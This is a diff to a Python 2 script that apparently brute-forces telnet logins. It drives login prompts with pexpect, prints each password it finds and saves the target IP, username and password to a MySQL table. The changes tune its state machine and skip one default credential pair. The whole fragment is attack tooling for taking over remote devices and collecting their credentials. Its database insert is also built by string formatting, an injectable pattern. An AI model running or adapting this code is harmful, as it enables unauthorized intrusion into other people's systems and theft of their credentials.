@@ -53,7 +53,7 @@ class user_state:
         elif index < 5:
             conn.new_state(user_state)
         else:
-            conn.new_state(None)
+            conn.new_state(conn_state)
 
 class passwd_state:
     @staticmethod
@@ -65,21 +65,22 @@ class passwd_state:
             return
         conn.child.sendline(passwd)
         index = conn.child.expect(["sername:","nter:","ccount:","ogin:","ssword:",pexpect.TIMEOUT,pexpect.EOF],timeout=10)
-        if index == 6:
+        if index == 5:
             print "Got password %s:%s-%s" % (conn.ip,conn.auth[0],conn.auth[1])
             conn.new_state(confirm_state)
         elif index < 4:
             conn.new_state(user_state)
-        elif index == 4:
-            conn.new_state(conn_state)
         else:
-            conn.new_state(None)
+            conn.new_state(conn_state)
 
 class confirm_state:
     @staticmethod
     def _run(conn):
         try:
             user,passwd = conn.auth
+            if conn.auth == ("user","password"):
+                conn.new_state(None)
+                return
             db = MySQLdb.connect("localhost","root","","auth",charset="utf8")
             cursor = db.cursor()
             cursor.execute("INSERT INTO auth_table(ip,port,username,password) values('%s','%d','%s','%s')" % (conn.ip,23,user,passwd,))
